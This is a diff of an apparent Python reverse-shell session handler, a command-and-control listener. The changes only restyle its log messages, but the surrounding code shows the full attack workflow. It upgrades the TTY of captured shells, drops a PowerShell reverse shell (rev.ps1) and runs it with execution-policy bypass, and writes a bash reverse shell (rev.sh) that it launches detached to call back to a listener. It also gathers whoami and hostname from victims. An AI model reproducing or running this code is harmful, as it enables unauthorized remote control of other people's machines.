@@ -126,14 +126,14 @@ def handle_client(client_socket, addr, session_number):
                 log_to_file(f"Command: {command}")
 
             if command.lower() == "bs":
-                print(f"{ORANGE}[*] Session {session_number} moved to background.{RESET}")
-                log_to_file(f"[*] Session {session_number} moved to background.")
+                print(f"{ORANGE}[+] Session {session_number} moved to background.{RESET}")
+                log_to_file(f"[+] Session {session_number} moved to background.")
                 stop_event.set()
                 return
 
             if command.lower() == "die":
-                print(f"{ORANGE}[-] Killing session {session_number}.{RESET}")
-                log_to_file(f"[-] Killing session {session_number}.")
+                print(f"{ORANGE}[!] Killing session {session_number}.{RESET}")
+                log_to_file(f"[!] Killing session {session_number}.")
                 stop_event.set()  # Stop receiving thread
                 recv_thread.join()  # Wait for thread to fully stop
                 try:
@@ -160,7 +160,7 @@ def handle_client(client_socket, addr, session_number):
                     print(f"{ORANGE}Captured whoami for session {session_number}: {whoami_output}{RESET}")
                     log_to_file(f"Captured whoami for session {session_number}: {whoami_output}")
                 except Exception as e:
-                    print_error(f"Error during gather for session {session_number}: {e}")
+                    print_error(f"[!] Error during gather for session {session_number}: {e}")
             # Check for "hostname" command
             if command.lower() == "hostname":
                 try:
@@ -175,7 +175,7 @@ def handle_client(client_socket, addr, session_number):
                     print(f"{ORANGE}Captured hostname for session {session_number}: {hostname_output}{RESET}")
                     log_to_file(f"Captured hostname for session {session_number}: {hostname_output}")
                 except Exception as e:
-                    print_error(f"Error during gather for session {session_number}: {e}")
+                    print_error(f"[!] Error during gather for session {session_number}: {e}")
 
             # Check for "stable" command
             if command.lower() == "stable":
@@ -187,10 +187,10 @@ def handle_client(client_socket, addr, session_number):
                     tty_command = 'python3 -c \'import pty; pty.spawn("/bin/bash")\'\n'
                     client_socket.sendall(tty_command.encode())
 
-                    print(f"{ORANGE}[*] Sent TTY upgrade command to session {session_number}.{RESET}")
-                    log_to_file(f"[*] Sent TTY upgrade command to session {session_number}.")
+                    print(f"{ORANGE}[+] Sent TTY upgrade command to session {session_number}.{RESET}")
+                    log_to_file(f"[+] Sent TTY upgrade command to session {session_number}.")
                 except Exception as e:
-                    print_error(f"Error during shell upgrade for session {session_number}: {e}")
+                    print_error(f"[!] Error during shell upgrade for session {session_number}: {e}")
 
             
             # builds a new revshell for the current session
@@ -222,14 +222,14 @@ def handle_client(client_socket, addr, session_number):
                     # Drop it on the client as rev.ps1
                     drop_command = f"echo '{ps_encoded}' > rev.ps1"
                     client_socket.sendall(drop_command.encode() + b"\n")
-                    print(f"{YELLOW}[*] Payload created using {listener_ip}:{listener_port} and saved as rev.ps1{RESET}")
-                    log_to_file(f"[*] Sent PowerShell payload using {listener_ip}:{listener_port} to session {session_number}")
+                    print(f"{YELLOW}[+] Payload created using {listener_ip}:{listener_port} and saved as rev.ps1{RESET}")
+                    log_to_file(f"[+] Sent PowerShell payload using {listener_ip}:{listener_port} to session {session_number}")
                     #exec_command = "powershell -ExecutionPolicy Bypass -File rev.ps1"
                     exec_command = "Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -File rev.ps1'"
                     client_socket.sendall(exec_command.encode() + b"\n")
 
                 except Exception as e:
-                    print_error(f"Error creating payload: {e}")
+                    print_error(f"[!] Error creating payload: {e}")
 
             # builds a new revshell for the current session
             # basically, if your current session elevates or is a new user
@@ -246,33 +246,33 @@ def handle_client(client_socket, addr, session_number):
                     # Command to write payload to rev.sh
                     drop_command = f'echo "{bash_payload}" > rev.sh && chmod +x rev.sh'
                     client_socket.sendall(drop_command.encode() + b"\n")
-                    print(f"{YELLOW}[*] Linux payload created using {listener_ip}:{listener_port} and saved as rev.sh{RESET}")
-                    log_to_file(f"[*] Sent bash reverse shell payload to session {session_number} using {listener_ip}:{listener_port}")
+                    print(f"{YELLOW}[+] Linux payload created using {listener_ip}:{listener_port} and saved as rev.sh{RESET}")
+                    log_to_file(f"[+] Sent bash reverse shell payload to session {session_number} using {listener_ip}:{listener_port}")
                     client_socket.sendall(b"setsid bash rev.sh >/dev/null 2>&1 < /dev/null &\n")
                 except Exception as e:
-                    print_error(f"Error creating Linux payload: {e}")
+                    print_error(f"[!] Error creating Linux payload: {e}")
 
             # Send other commands to the client
             else:
                 client_socket.sendall(command.encode() + b"\n")
 
     except KeyboardInterrupt:
-        print(f"\n{ORANGE}[*] Session {session_number} moved to background.{RESET}")
-        log_to_file(f"[*] Session {session_number} moved to background.")
+        print(f"\n{ORANGE}[+] Session {session_number} moved to background.{RESET}")
+        log_to_file(f"[+] Session {session_number} moved to background.")
         stop_event.set()
         recv_thread.join()
         return
     except BrokenPipeError:
-        print(f"{RED}[-] Session {session_number} disconnected.{RESET}")
-        log_to_file(f"[-] Session {session_number} disconnected.")
+        print(f"{RED}[!] Session {session_number} disconnected.{RESET}")
+        log_to_file(f"[!] Session {session_number} disconnected.")
         stop_event.set()
         recv_thread.join()
         return
     except Exception as e:
         print_error(str(e))
 
-    print(f"{RED}[-] Session {session_number} disconnected.{RESET}")
-    log_to_file(f"[-] Session {session_number} disconnected.")  # Log session disconnection
+    print(f"{RED}[!] Session {session_number} disconnected.{RESET}")
+    log_to_file(f"[!] Session {session_number} disconnected.")  # Log session disconnection
     with lock:
         del sessions[session_number]
 
